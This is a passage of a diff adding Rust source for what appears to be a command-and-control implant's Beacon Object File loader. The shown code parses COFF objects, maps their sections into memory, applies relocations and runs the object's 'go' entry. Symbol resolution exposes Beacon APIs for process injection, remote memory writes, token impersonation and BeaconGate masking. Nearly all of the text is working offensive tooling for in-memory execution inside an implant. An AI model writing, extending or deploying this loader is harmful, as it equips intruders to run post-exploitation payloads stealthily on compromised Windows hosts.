+    blob.extend_from_slice(&(name_bytes.len() as u32).to_be_bytes());
+    blob.extend_from_slice(&name_bytes);
+    blob.extend_from_slice(&(len as u32).to_be_bytes());
+    blob.extend_from_slice(slice::from_raw_parts(data as *const u8, len as usize));
+    push_context_message(protocol::CALLBACK_AX_DOWNLOAD_MEM as u16, &blob);
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn to_wide_char(src: *mut c_char, dst: *mut u16, max: i32) -> BOOL {
+    if src.is_null() || dst.is_null() || max <= 0 {
+        return FALSE;
+    }
+    let written = MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, max);
+    if written > 0 { TRUE } else { FALSE }
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_register_thread_callback(_callback_function: *mut c_void, _callback_data: *mut c_void) {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_unregister_thread_callback() {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_wakeup() {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_get_stop_job_event() -> HANDLE { stop_job_event() }
+
+#[cfg(windows)]
+fn resolve_external_symbol(symbol_name: &str) -> Option<*mut c_void> {
+    let mut cursor = trim_leading_underscores(symbol_name);
+    if let Some(rest) = cursor.strip_prefix("imp_") {
+        cursor = rest;
+    }
+
+    let internal = match cursor {
+        "BeaconDataParse" => Some(beacon_data_parse as *const () as *mut c_void),
+        "BeaconDataInt" => Some(beacon_data_int as *const () as *mut c_void),
+        "BeaconDataShort" => Some(beacon_data_short as *const () as *mut c_void),
+        "BeaconDataLength" => Some(beacon_data_length as *const () as *mut c_void),
+        "BeaconDataExtract" => Some(beacon_data_extract as *const () as *mut c_void),
+        "BeaconDataPtr" => Some(beacon_data_ptr as *const () as *mut c_void),
+        "BeaconOutput" => Some(beacon_output as *const () as *mut c_void),
+        "BeaconPrintf" => Some(beacon_printf as *const () as *mut c_void),
+        "BeaconFormatAlloc" => Some(beacon_format_alloc as *const () as *mut c_void),
+        "BeaconFormatReset" => Some(beacon_format_reset as *const () as *mut c_void),
+        "BeaconFormatAppend" => Some(beacon_format_append as *const () as *mut c_void),
+        "BeaconFormatPrintf" => Some(beacon_format_printf as *const () as *mut c_void),
+        "BeaconFormatToString" => Some(beacon_format_to_string as *const () as *mut c_void),
+        "BeaconFormatFree" => Some(beacon_format_free as *const () as *mut c_void),
+        "BeaconFormatInt" => Some(beacon_format_int as *const () as *mut c_void),
+        "BeaconUseToken" => Some(beacon_use_token as *const () as *mut c_void),
+        "BeaconRevertToken" => Some(beacon_revert_token as *const () as *mut c_void),
+        "BeaconIsAdmin" => Some(beacon_is_admin as *const () as *mut c_void),
+        "toWideChar" => Some(to_wide_char as *const () as *mut c_void),
+        "BeaconAddValue" => Some(beacon_add_value as *const () as *mut c_void),
+        "BeaconGetValue" => Some(beacon_get_value as *const () as *mut c_void),
+        "BeaconRemoveValue" => Some(beacon_remove_value as *const () as *mut c_void),
+        "BeaconGetSpawnTo" => Some(beacon_get_spawn_to as *const () as *mut c_void),
+        "BeaconSpawnTemporaryProcess" => Some(beacon_spawn_temporary_process as *const () as *mut c_void),
+        "BeaconInjectProcess" => Some(beacon_inject_process as *const () as *mut c_void),
+        "BeaconInjectTemporaryProcess" => Some(beacon_inject_temporary_process as *const () as *mut c_void),
+        "BeaconCleanupProcess" => Some(beacon_cleanup_process as *const () as *mut c_void),
+        "BeaconVirtualAlloc" => Some(beacon_virtual_alloc as *const () as *mut c_void),
+        "BeaconVirtualAllocEx" => Some(beacon_virtual_alloc_ex as *const () as *mut c_void),
+        "BeaconVirtualProtect" => Some(beacon_virtual_protect as *const () as *mut c_void),
+        "BeaconVirtualProtectEx" => Some(beacon_virtual_protect_ex as *const () as *mut c_void),
+        "BeaconVirtualFree" => Some(beacon_virtual_free as *const () as *mut c_void),
+        "BeaconGetThreadContext" => Some(beacon_get_thread_context as *const () as *mut c_void),
+        "BeaconSetThreadContext" => Some(beacon_set_thread_context as *const () as *mut c_void),
+        "BeaconResumeThread" => Some(beacon_resume_thread as *const () as *mut c_void),
+        "BeaconOpenProcess" => Some(beacon_open_process as *const () as *mut c_void),
+        "BeaconOpenThread" => Some(beacon_open_thread as *const () as *mut c_void),
+        "BeaconCloseHandle" => Some(beacon_close_handle as *const () as *mut c_void),
+        "BeaconUnmapViewOfFile" => Some(beacon_unmap_view_of_file as *const () as *mut c_void),
+        "BeaconVirtualQuery" => Some(beacon_virtual_query as *const () as *mut c_void),
+        "BeaconDuplicateHandle" => Some(beacon_duplicate_handle as *const () as *mut c_void),
+        "BeaconReadProcessMemory" => Some(beacon_read_process_memory as *const () as *mut c_void),
+        "BeaconWriteProcessMemory" => Some(beacon_write_process_memory as *const () as *mut c_void),
+        "BeaconInformation" => Some(beacon_information as *const () as *mut c_void),
+        "BeaconGetOutputData" => Some(beacon_get_output_data as *const () as *mut c_void),
+        "BeaconDownload" => Some(beacon_download as *const () as *mut c_void),
+        "BeaconGetSyscallInformation" => Some(beacon_get_syscall_information as *const () as *mut c_void),
+        "swap_endianess" => Some(swap_endianess as *const () as *mut c_void),
+        "BeaconDataStoreGetItem" => Some(beacon_data_store_get_item as *const () as *mut c_void),
+        "BeaconDataStoreProtectItem" => Some(beacon_data_store_protect_item as *const () as *mut c_void),
+        "BeaconDataStoreUnprotectItem" => Some(beacon_data_store_unprotect_item as *const () as *mut c_void),
+        "BeaconDataStoreMaxEntries" => Some(beacon_data_store_max_entries as *const () as *mut c_void),
+        "BeaconGetCustomUserData" => Some(beacon_get_custom_user_data as *const () as *mut c_void),
+        "BeaconDisableBeaconGate" => Some(beacon_disable_beacon_gate as *const () as *mut c_void),
+        "BeaconEnableBeaconGate" => Some(beacon_enable_beacon_gate as *const () as *mut c_void),
+        "BeaconDisableBeaconGateMasking" => Some(beacon_disable_beacon_gate_masking as *const () as *mut c_void),
+        "BeaconEnableBeaconGateMasking" => Some(beacon_enable_beacon_gate_masking as *const () as *mut c_void),
+        "AxAddScreenshot" => Some(ax_add_screenshot as *const () as *mut c_void),
+        "AxDownloadMemory" => Some(ax_download_memory as *const () as *mut c_void),
+        "BeaconRegisterThreadCallback" => Some(beacon_register_thread_callback as *const () as *mut c_void),
+        "BeaconUnregisterThreadCallback" => Some(beacon_unregister_thread_callback as *const () as *mut c_void),
+        "BeaconWakeup" => Some(beacon_wakeup as *const () as *mut c_void),
+        "BeaconGetStopJobEvent" => Some(beacon_get_stop_job_event as *const () as *mut c_void),
+        _ => None,
+    };
+    if internal.is_some() {
+        return internal;
+    }
+
+    if cursor.eq_ignore_ascii_case("C_specific_handler") {
+        let module = CString::new("ntdll.dll").ok()?;
+        let symbol = CString::new("__C_specific_handler").ok()?;
+        let handle = unsafe { LoadLibraryA(module.as_ptr()) };
+        if handle.is_null() {
+            return None;
+        }
+        return Some(unsafe { GetProcAddress(handle, symbol.as_ptr() as *const u8) });
+    }
+
+    let (module_name, function_name) = if let Some((module, function)) = cursor.split_once('$') {
+        (module.to_string(), function.to_string())
+    } else {
+        ("kernel32".to_string(), cursor.to_string())
+    };
+
+    let module_name = if module_name.contains('.') {
+        module_name
+    } else {
+        format!("{module_name}.dll")
+    };
+
+    let module = cstring_lossy(&module_name)?;
+    let handle = unsafe { LoadLibraryA(module.as_ptr()) };
+    if handle.is_null() {
+        return None;
+    }
+
+    if let Some(rest) = function_name.strip_prefix('#') {
+        let ordinal = rest.parse::<usize>().ok()?;
+        return Some(unsafe { GetProcAddress(handle, ordinal as *const u8) });
+    }
+
+    let function = cstring_lossy(&function_name)?;
+    Some(unsafe { GetProcAddress(handle, function.as_ptr() as *const u8) })
+}
+
+#[cfg(windows)]
+struct MappedSection {
+    base: *mut u8,
+    size: usize,
+    characteristics: u32,
+}
+
+#[cfg(windows)]
+impl Drop for MappedSection {
+    fn drop(&mut self) {
+        if !self.base.is_null() {
+            unsafe {
+                let _ = VirtualFree(self.base as LPVOID, 0, MEM_RELEASE);
+            }
+        }
+    }
+}
+
+#[cfg(windows)]
+fn parse_headers(object: &[u8]) -> Result<(FileHeader, Vec<SectionHeader>, usize, usize), String> {
+    let header = unsafe { read_struct::<FileHeader>(object, 0) }?;
+    if header.machine != IMAGE_FILE_MACHINE_AMD64 {
+        return Err("Only x64 BOFs are supported by this Rust template".to_string());
+    }
+    if header.number_of_sections == 0 || header.number_of_sections as usize > MAX_BOF_SECTIONS {
+        return Err("BOF section count exceeds template limits".to_string());
+    }
+
+    let sections_offset = SIZEOF_FILE_HEADER + header.size_of_optional_header as usize;
+    let mut sections = Vec::with_capacity(header.number_of_sections as usize);
+    for index in 0..header.number_of_sections as usize {
+        sections.push(unsafe { read_struct::<SectionHeader>(object, sections_offset + index * SIZEOF_SECTION_HEADER) }?);
+    }
+
+    let symbol_offset = header.pointer_to_symbol_table as usize;
+    let symbol_bytes = header.number_of_symbols as usize * SIZEOF_SYMBOL;
+    let string_offset = symbol_offset
+        .checked_add(symbol_bytes)
+        .ok_or_else(|| "COFF symbol table overflow".to_string())?;
+    if symbol_offset == 0 || string_offset + 4 > object.len() {
+        return Err("BOF symbol table pointer is invalid".to_string());
+    }
+    Ok((header, sections, symbol_offset, string_offset))
+}
+
+#[cfg(windows)]
+fn map_sections(object: &[u8], sections: &[SectionHeader]) -> Result<Vec<MappedSection>, String> {
+    let mut mapped = Vec::with_capacity(sections.len());
+    for section in sections {
+        let size = usize::max(section.virtual_size as usize, section.size_of_raw_data as usize);
+        if size == 0 {
+            mapped.push(MappedSection {
+                base: null_mut(),
+                size: 0,
+                characteristics: section.characteristics,
+            });
+            continue;
+        }
+
+        let base = unsafe { VirtualAlloc(null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as *mut u8 };
+        if base.is_null() {
+            return Err("VirtualAlloc failed while mapping BOF sections".to_string());
+        }
+
+        if section.size_of_raw_data > 0 {
+            let start = section.pointer_to_raw_data as usize;
+            let end = start
+                .checked_add(section.size_of_raw_data as usize)
+                .ok_or_else(|| "BOF raw section overflow".to_string())?;
+            if end > object.len() {
+                unsafe { let _ = VirtualFree(base as LPVOID, 0, MEM_RELEASE); }
+                return Err("BOF section raw data is truncated".to_string());
+            }
+            unsafe {
+                ptr::copy_nonoverlapping(object[start..end].as_ptr(), base, section.size_of_raw_data as usize);
+            }
+        }
+        if size > section.size_of_raw_data as usize {
+            unsafe {
+                ptr::write_bytes(base.add(section.size_of_raw_data as usize), 0, size - section.size_of_raw_data as usize);
+            }
+        }
+
+        mapped.push(MappedSection {
+            base,
+            size,
+            characteristics: section.characteristics,
+        });
+    }
+    Ok(mapped)
+}
+
+#[cfg(windows)]
+fn apply_relocations(
+    object: &[u8],
+    header: &FileHeader,
+    sections: &[SectionHeader],
+    mapped: &[MappedSection],
+    symbols: &[CoffSymbol],
+    string_table: &[u8],
+) -> Result<(), String> {
+    for (section_index, section) in sections.iter().enumerate() {
+        for reloc_index in 0..section.number_of_relocations as usize {
+            let relocation_offset = section.pointer_to_relocations as usize + reloc_index * SIZEOF_RELOCATION;
+            let relocation = unsafe { read_struct::<Relocation>(object, relocation_offset) }?;
+            if relocation.symbol_table_index as usize >= symbols.len() {
+                return Err("BOF relocation references invalid symbol index".to_string());
+            }
+
+            let target_section = mapped
+                .get(section_index)
+                .ok_or_else(|| "BOF relocation references missing target section".to_string())?;
+            if target_section.base.is_null() {
+                return Err("BOF relocation references unmapped target section".to_string());
+            }
+            if relocation.virtual_address as usize + 8 > target_section.size {
+                return Err("BOF relocation target falls outside mapped section".to_string());
+            }
+
+            let symbol = &symbols[relocation.symbol_table_index as usize];
+            let resolved = if symbol.section_number > 0 {
+                let src_index = (symbol.section_number - 1) as usize;
+                let source = mapped
+                    .get(src_index)
+                    .ok_or_else(|| "BOF relocation references invalid source section".to_string())?;
+                if source.base.is_null() {
+                    return Err("BOF relocation references unmapped source section".to_string());
+                }
+                unsafe { source.base.add(symbol.value as usize) as usize }
+            } else {
+                let name = symbol_name(symbol, string_table)?;
+                resolve_external_symbol(&name)
+                    .map(|ptr| ptr as usize)
+                    .ok_or_else(|| format!("BOF unresolved symbol: {name}"))?
+            };
+
+            let target = unsafe { target_section.base.add(relocation.virtual_address as usize) };
+            unsafe {
+                match relocation.reloc_type {
+                    IMAGE_REL_AMD64_ADDR64 => {
+                        ptr::write_unaligned(target as *mut u64, resolved as u64);
+                    }
+                    IMAGE_REL_AMD64_ADDR32NB => {
+                        let image_base = mapped.first().map_or(0usize, |section| section.base as usize);
+                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(image_base) as u32);
+                    }
+                    IMAGE_REL_AMD64_REL32 => {
+                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 4) as u32);
+                    }
+                    IMAGE_REL_AMD64_REL32_1 => {
+                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 5) as u32);
+                    }
+                    IMAGE_REL_AMD64_REL32_2 => {
+                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 6) as u32);
+                    }
+                    IMAGE_REL_AMD64_REL32_3 => {
+                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 7) as u32);
+                    }
+                    IMAGE_REL_AMD64_REL32_4 => {
+                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 8) as u32);
+                    }
+                    IMAGE_REL_AMD64_REL32_5 => {
+                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 9) as u32);
+                    }
+                    other => {
+                        return Err(format!("Unsupported BOF relocation type: 0x{other:04x}"));
+                    }
+                }
+            }
+        }
+    }
+
+    let _ = header;
+    Ok(())
+}
+
+#[cfg(windows)]
+fn find_entry_point(
+    symbols: &[CoffSymbol],
+    string_table: &[u8],
+    mapped: &[MappedSection],
+    entry_name: &str,
+) -> Result<*mut c_void, String> {
+    let mut index = 0usize;
+    while index < symbols.len() {
+        let symbol = &symbols[index];
+        if symbol.section_number > 0 {
+            let name = symbol_name(symbol, string_table)?;
+            if trim_leading_underscores(&name).eq_ignore_ascii_case(entry_name) {
+                let section_index = (symbol.section_number - 1) as usize;
+                let section = mapped
+                    .get(section_index)
+                    .ok_or_else(|| "BOF entry references invalid section".to_string())?;
+                if section.base.is_null() {
+                    return Err("BOF entry references unmapped section".to_string());
+                }
+                let entry = unsafe { section.base.add(symbol.value as usize) };
+                return Ok(entry as *mut c_void);
+            }
+        }
+        index += 1 + symbol.number_of_aux_symbols as usize;
+    }
+    Err("BOF entry point 'go' was not found".to_string())
+}
+
+#[cfg(windows)]
+fn protect_sections(sections: &[SectionHeader], mapped: &[MappedSection]) {
+    for (section, mapping) in sections.iter().zip(mapped.iter()) {
+        if mapping.base.is_null() || mapping.size == 0 {
+            continue;
+        }
+        let mut old = 0u32;
+        unsafe {
+            let _ = VirtualProtect(mapping.base as LPVOID, mapping.size, section_protect(section), &mut old);
+        }
+    }
+}
+
+#[cfg(windows)]
+pub fn load(object: &[u8], args: &[u8]) -> Result<BofContext, String> {
+    let _ = protocol::COMMAND_EXEC_BOF;
+
+    let mut ctx = BofContext::new();
+    if object.len() < SIZEOF_FILE_HEADER {
+        ctx.push(BOF_ERROR_PARSE, b"BOF payload is empty or truncated".to_vec());
+        return Ok(ctx);
+    }
+
+    let (header, sections, symbol_offset, string_offset) = match parse_headers(object) {
+        Ok(value) => value,
+        Err(err) => {
+            ctx.push(BOF_ERROR_PARSE, err.into_bytes());
+            return Ok(ctx);
+        }
+    };
+
+    let symbols: Vec<CoffSymbol> = (0..header.number_of_symbols as usize)
+        .map(|index| unsafe { read_struct::<CoffSymbol>(object, symbol_offset + index * SIZEOF_SYMBOL) })
+        .collect::<Result<_, _>>()
+        .map_err(|err| {
+            let mut out = BofContext::new();
+            out.push(BOF_ERROR_PARSE, err.clone().into_bytes());
+            err
+        })?;
+
+    let string_table_size = u32::from_le_bytes(object[string_offset..string_offset + 4].try_into().unwrap()) as usize;
+    if string_offset + string_table_size > object.len() {
+        ctx.push(BOF_ERROR_PARSE, b"COFF string table exceeds object bounds".to_vec());
+        return Ok(ctx);
+    }
+    let string_table = &object[string_offset + 4..string_offset + string_table_size];
+
+    let mapped = match map_sections(object, &sections) {
+        Ok(mapped) => mapped,
+        Err(err) => {
+            ctx.push(BOF_ERROR_ALLOC, err.into_bytes());
+            return Ok(ctx);
+        }
+    };
+
+    if let Err(err) = apply_relocations(object, &header, &sections, &mapped, &symbols, string_table) {
+        let msg_type = if err.starts_with("BOF unresolved symbol:") { BOF_ERROR_SYMBOL } else { BOF_ERROR_PARSE };
+        ctx.push(msg_type, err.into_bytes());
+        return Ok(ctx);
+    }
+
+    let entry = match find_entry_point(&symbols, string_table, &mapped, "go") {
+        Ok(entry) => entry,
+        Err(err) => {
+            ctx.push(BOF_ERROR_ENTRY, err.into_bytes());
+            return Ok(ctx);
+        }
+    };
+
+    protect_sections(&sections, &mapped);
+
+    type BofEntry = unsafe extern "C" fn(*mut c_char, i32);
+    CURRENT_CONTEXT.store(&mut ctx as *mut BofContext, Ordering::SeqCst);
+    unsafe {
+        let entry: BofEntry = std::mem::transmute(entry);
+        entry(args.as_ptr() as *mut c_char, args.len() as i32);
+    }
+    CURRENT_CONTEXT.store(null_mut(), Ordering::SeqCst);
+
+    Ok(ctx)
+}
+
+#[cfg(windows)]
+pub fn load_async(object: &[u8], args: &[u8]) -> Result<BofContext, String> {
+    let _ = protocol::COMMAND_EXEC_BOF_ASYNC;
+    load(object, args)
+}
+
+#[cfg(windows)]
+pub fn pack_args(format: &str, args: &[&[u8]]) -> Result<Vec<u8>, String> {
+    let mut packed = Vec::new();
+    let mut arg_index = 0usize;
+
+    for ch in format.chars() {
+        let value = args.get(arg_index).ok_or_else(|| format!("missing argument for format specifier '{ch}'"))?;
+        match ch {
+            'i' => {
+                if value.len() < 4 {
+                    return Err("integer argument must be at least 4 bytes".to_string());
+                }
+                let num = i32::from_ne_bytes(value[..4].try_into().unwrap());
+                packed.extend_from_slice(&num.to_be_bytes());
+            }
+            's' => {
+                if value.len() < 2 {
+                    return Err("short argument must be at least 2 bytes".to_string());
+                }
+                let num = i16::from_ne_bytes(value[..2].try_into().unwrap());
+                packed.extend_from_slice(&num.to_be_bytes());
+            }
+            'z' => {
+                let mut bytes = value.to_vec();
+                if !bytes.ends_with(&[0]) {
+                    bytes.push(0);
+                }
+                packed.extend_from_slice(&(bytes.len() as u32).to_be_bytes());
+                packed.extend_from_slice(&bytes);
+            }
+            'Z' => {
+                let text = String::from_utf8_lossy(value);
+                let mut wide: Vec<u16> = text.encode_utf16().collect();
+                if !wide.ends_with(&[0]) {
+                    wide.push(0);
+                }
+                let bytes = unsafe {
+                    slice::from_raw_parts(wide.as_ptr() as *const u8, wide.len() * size_of::<u16>())
+                };
+                packed.extend_from_slice(&(bytes.len() as u32).to_be_bytes());
+                packed.extend_from_slice(bytes);
+            }
+            'b' => {
+                packed.extend_from_slice(&(value.len() as u32).to_be_bytes());
+                packed.extend_from_slice(value);
+            }
+            other => {
+                return Err(format!("unsupported BOF pack format specifier '{other}'"));
+            }
+        }
+        arg_index += 1;
+    }
+
+    if arg_index != args.len() {
+        return Err("too many arguments supplied to BOF pack_args".to_string());
+    }
+
+    Ok(packed)
+}
